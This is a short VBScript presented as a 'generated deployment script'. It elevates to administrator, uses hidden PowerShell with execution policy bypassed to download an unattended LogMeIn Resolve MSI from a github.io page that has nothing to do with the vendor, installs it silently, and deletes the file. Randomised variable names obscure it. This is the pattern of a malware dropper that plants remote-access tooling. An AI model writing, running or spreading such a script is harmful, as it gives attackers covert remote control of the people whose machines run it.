' Generated Deployment Script – MSI
' URL: https://pointofline.github.io/si/LogMeInResolve_Unattended9.msi
Option Explicit

Dim ypxCb, iVWJmJZ, tNfZa, TjtzMjHd, FWCsT

Set ypxCb = CreateObject("WScript.Shell")
Set iVWJmJZ = CreateObject("Scripting.FileSystemObject")

' Request elevation if not already running as administrator
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

' Resolve %TEMP% and build the full installer path
tNfZa = ypxCb.ExpandEnvironmentStrings("%TEMP%")
TjtzMjHd = tNfZa & "\" & "installer740.msi"

' Download the installer via PowerShell (hidden window, wait for completion)
FWCsT = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & "(New-Object Net.WebClient).DownloadFile(" & Chr(39) & "https://pointofline.github.io/si/LogMeInResolve_Unattended9.msi" & Chr(39) & "," & Chr(39) & TjtzMjHd & Chr(39) & ")" & Chr(34)
ypxCb.Run FWCsT, 0, True

' Verify download — abort if file is missing or zero bytes
If Not iVWJmJZ.FileExists(TjtzMjHd) Then WScript.Quit 1
If iVWJmJZ.GetFile(TjtzMjHd).Size = 0 Then
    On Error Resume Next
    iVWJmJZ.DeleteFile TjtzMjHd
    On Error GoTo 0
    WScript.Quit 1
End If

' Run the MSI silently (msiexec manages its own UI; hidden window is fine)
FWCsT = "msiexec /i " & Chr(34) & TjtzMjHd & Chr(34) & " /qn /norestart"
ypxCb.Run FWCsT, 0, True

' Wait briefly for any cleanup processes, then remove the temp file
WScript.Sleep 6000
On Error Resume Next
iVWJmJZ.DeleteFile TjtzMjHd
On Error GoTo 0

Set ypxCb = Nothing
Set iVWJmJZ = Nothing
